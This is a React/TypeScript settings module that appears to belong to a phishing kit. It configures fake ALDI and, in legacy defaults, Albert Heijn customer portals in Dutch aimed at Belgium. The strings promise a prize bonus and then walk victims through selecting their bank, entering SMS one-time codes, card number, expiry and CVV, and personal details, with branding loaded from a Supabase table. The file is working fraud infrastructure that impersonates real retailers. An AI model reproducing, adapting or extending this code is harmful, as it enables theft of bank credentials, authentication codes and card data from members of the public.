"use client";

import { createContext, useContext, useEffect, useState, ReactNode, useMemo, useRef } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { normalizeCountryName } from "@/lib/country-utils";
import { optimizeSupabaseImageUrl } from "@/lib/asset-url";

export type GlobalSettings = {
  logo_url: string;
  bg_url: string;
  portal_name: string;
  support_center_name: string;
  win_title: string;
  win_subtitle: string;
  win_button: string;
  banken_title: string;
  banken_subtitle: string;
  banken_search_placeholder: string;
  wait_title: string;
  wait_subtitle: string;
  sms_title: string;
  sms_subtitle: string;
  sms_input_label: string;
  sms_button: string;
  sms_loading: string;
  card_title: string;
  card_subtitle: string;
  card_owner_label: string;
  card_number_label: string;
  card_expiry_label: string;
  card_cvv_label: string;
  card_button: string;
  code_title: string;
  code_subtitle: string;
  code_button: string;
  live_support_title: string;
  live_support_subtitle: string;
  live_support_button: string;
  profile_title_small: string;
  profile_title_main: string;
  profile_subtitle: string;
  profile_firstname_label: string;
  profile_lastname_label: string;
  profile_phone_label: string;
  profile_button: string;
  profile_loading_text: string;
  site_language: string;
  target_country?: string;

  wheel_settings: any;
};

type LegacyGlobalSettings = Partial<GlobalSettings> & {
  background_url?: string;
};

const LEGACY_ALBERT_HEIJN_LOGO_URL = "https://static.ah.nl/ah-static/images/ah-ui-bridge-components/logo/logo-ah.svg";
const ALBERT_HEIJN_LOGO_URL = "/form-assets/aldi-logo.png";
const PORTAL_BG_URL = "/form-assets/bg-desktop.png";
const LEGACY_BG_URL = "/spar-bg.png";
const LEGACY_PORTAL_NAME = "Albert Heijn klantenportaal";
const LEGACY_SUPPORT_CENTER_NAME = "Albert Heijn service";
const LEGACY_WIN_TITLE = "Exclusieve Albert Heijn bonus";
const LEGACY_WIN_SUBTITLE =
  "Gefeliciteerd! Je bent geselecteerd voor onze Albert Heijn actie van vandaag. Klik op de knop hieronder om je bonus van 5.000 euro te claimen.";

function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettings> {
  const next = { ...settings };

  if (!next.bg_url && next.background_url) {
    next.bg_url = next.background_url;
  }

  if (
    !next.logo_url ||
    next.logo_url === "/logo.png" ||
    next.logo_url === LEGACY_ALBERT_HEIJN_LOGO_URL
  ) {
    next.logo_url = "/form-assets/aldi-logo.png";
  }

  if (!next.bg_url || next.bg_url === LEGACY_BG_URL) {
    next.bg_url = PORTAL_BG_URL;
  }

  if (!next.portal_name || next.portal_name === LEGACY_PORTAL_NAME || /mercator|portal za stranke/i.test(next.portal_name)) {
    next.portal_name = "ALDI klantenportaal";
  }

  if (!next.support_center_name || next.support_center_name === LEGACY_SUPPORT_CENTER_NAME || /mercator|pomoč/i.test(next.support_center_name)) {
    next.support_center_name = "ALDI klantenservice";
  }

  if (!next.win_title || next.win_title === LEGACY_WIN_TITLE || /mercator|ekskluzivna/i.test(next.win_title)) {
    next.win_title = "Exclusieve ALDI-bonus";
  }

  if (!next.win_subtitle || next.win_subtitle === LEGACY_WIN_SUBTITLE || /mercator|čestitamo|prevzem/i.test(next.win_subtitle)) {
    next.win_subtitle =
      "Gefeliciteerd! U bent geselecteerd voor de ALDI-actie van vandaag. Klik op de onderstaande knop om uw bonus op te eisen.";
  }

  if (!next.target_country || ["Hollanda", "Estonya", "Slovenija", "Slovenia"].includes(next.target_country)) {
    next.target_country = "Belçika";
  }

  if (next.target_country) {
    next.target_country = normalizeCountryName(next.target_country);
  }

  if (!next.site_language || next.site_language === "et" || next.site_language === "lt" || next.site_language === "sl") {
    next.site_language = "nl";
  }

  return next;
}

export const defaultSettings: GlobalSettings = {
  logo_url: "/form-assets/aldi-logo.png",
  bg_url: PORTAL_BG_URL,
  portal_name: "ALDI klantenportaal",
  support_center_name: "ALDI klantenservice",
  win_title: "Exclusieve ALDI-bonus",
  win_subtitle:
    "Gefeliciteerd! U bent geselecteerd voor de ALDI-actie van vandaag. Klik op de onderstaande knop om uw bonus op te eisen.",
  win_button: "Bonus claimen",
  banken_title: "Kies uw bank",
  banken_subtitle: "Kies uw Belgische bank om verder te gaan.",
  banken_search_placeholder: "Zoek uw bank...",
  wait_title: "Even geduld",
  wait_subtitle: "Uw aanvraag wordt veilig verwerkt...",
  sms_title: "SMS-beveiligingscode",
  sms_subtitle: "Voer de {digits}-cijferige code in.",
  sms_input_label: "Eenmalige code",
  sms_button: "Bevestigen",
  sms_loading: "Verwerken...",
  card_title: "Betaalgegevens",
  card_subtitle: "Controleer en bevestig uw gegevens.",
  card_owner_label: "Naam kaarthouder",
  card_number_label: "Kaartnummer",
  card_expiry_label: "Vervaldatum MM/JJ",
  card_cvv_label: "Beveiligingscode",
  card_button: "Doorgaan",
  code_title: "Welkom",
  code_subtitle: "Voer de deelnamecode in die u van {partner} heeft ontvangen om uw prijs te ontgrendelen.",
  code_button: "Code bevestigen",
  live_support_title: "Live-ondersteuning",
  live_support_subtitle:
    "Om verder te gaan, moet u contact opnemen met onze klantenservice.\n\nKlik op de onderstaande knop om het gesprek te starten.",
  live_support_button: "Start gesprek",
  profile_title_small: "Prijsbevestiging",
  profile_title_main: "Uw bonusbedrag",
  profile_subtitle: "Bevestig uw gegevens voor verdere verwerking.",
  profile_firstname_label: "Voornaam",
  profile_lastname_label: "Achternaam",
  profile_phone_label: "Mobiel telefoonnummer",
  profile_button: "Doorgaan",
  profile_loading_text: "Verwerken...",
  site_language: "nl",
  target_country: "Belçika",
  wheel_settings: {},
};

const SettingsContext = createContext<{ settings: GlobalSettings; loading: boolean }>({
  settings: defaultSettings,
  loading: false,
});

export function SettingsProvider({ children }: { children: ReactNode }) {
  const [settings, setSettings] = useState<GlobalSettings>(defaultSettings);
  const [loading, setLoading] = useState(true);
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const bgSignatureRef = useRef("");

  useEffect(() => {
    async function loadSettings() {
      if (!supabase) {
        setLoading(false);
        return;
      }
      const { data, error } = await supabase
        .from("global_settings")
        .select("*")
        .limit(1)
        .maybeSingle();

      if (data && !error) {
        setSettings((prev) => normalizeBranding({ ...prev, ...data }) as GlobalSettings);
      }
      setLoading(false);
    }
    
    void loadSettings();
  }, [supabase]);

  // Apply custom background image dynamically to the body
  useEffect(() => {
    let frameId = 0;

    const updateBg = () => {
      if (frameId) {
        window.cancelAnimationFrame(frameId);
      }

      frameId = window.requestAnimationFrame(() => {
        frameId = 0;

      const isMobile = window.innerWidth <= 768;
      const targetWidth = Math.min(
        Math.round(window.innerWidth * Math.max(window.devicePixelRatio || 1, 1)),
        isMobile ? 900 : 1600,
      );
      
      let activeBg: string | "" = isMobile && settings.wheel_settings?.bg_url_mobile 
        ? settings.wheel_settings.bg_url_mobile 
        : settings.bg_url;
        
      const pageBgs = settings.wheel_settings?.page_backgrounds || {};
      const path = window.location.pathname;
      const isWheelPage = /^\/wheel(\/|$|\?)/.test(path) || path.startsWith("/wheel");

      if (path.includes('/code') && pageBgs.code) activeBg = pageBgs.code;
      else if (isWheelPage && pageBgs.wheel) activeBg = pageBgs.wheel;
      // Wheel page: explicitly NO portal background by default (transparent — only wheel's own container background visible)
      else if (isWheelPage) activeBg = "";
      else if (path.includes('/win') && pageBgs.win) activeBg = pageBgs.win;
      else if (path.includes('/form') && pageBgs.form) activeBg = pageBgs.form;
      else if (path.includes('/banken') && pageBgs.banken) activeBg = pageBgs.banken;
      else if (path.includes('/sms') && pageBgs.sms) activeBg = pageBgs.sms;
      else if (path.includes('/card') && pageBgs.card) activeBg = pageBgs.card;

      const nextSignatureNoBg = `${window.location.pathname}|no-bg`;
      if (!activeBg) {
        if (bgSignatureRef.current !== nextSignatureNoBg) {
          bgSignatureRef.current = nextSignatureNoBg;
          document.documentElement.style.setProperty('--custom-bg', 'none');
        }
        return;
      }

      const optimizedBg = optimizeSupabaseImageUrl(activeBg, {
        width: targetWidth,
        quality: isMobile ? 60 : 68,
        format: "webp",
      });
      const nextSignature = `${window.location.pathname}|${optimizedBg}`;
      if (bgSignatureRef.current === nextSignature) {
        return;
      }

      bgSignatureRef.current = nextSignature;
      document.documentElement.style.setProperty('--custom-bg', `url("${optimizedBg}")`);
      });
    };

    updateBg();
    window.addEventListener('resize', updateBg);
    window.addEventListener('orientationchange', updateBg);
    return () => {
      if (frameId) {
        window.cancelAnimationFrame(frameId);
      }
      window.removeEventListener('resize', updateBg);
      window.removeEventListener('orientationchange', updateBg);
    };
  }, [settings.bg_url, settings.wheel_settings, loading]);

  return (
    <SettingsContext.Provider value={{ settings, loading }}>
      {children}
    </SettingsContext.Provider>
  );
}

export function useSettings() {
  return useContext(SettingsContext);
}
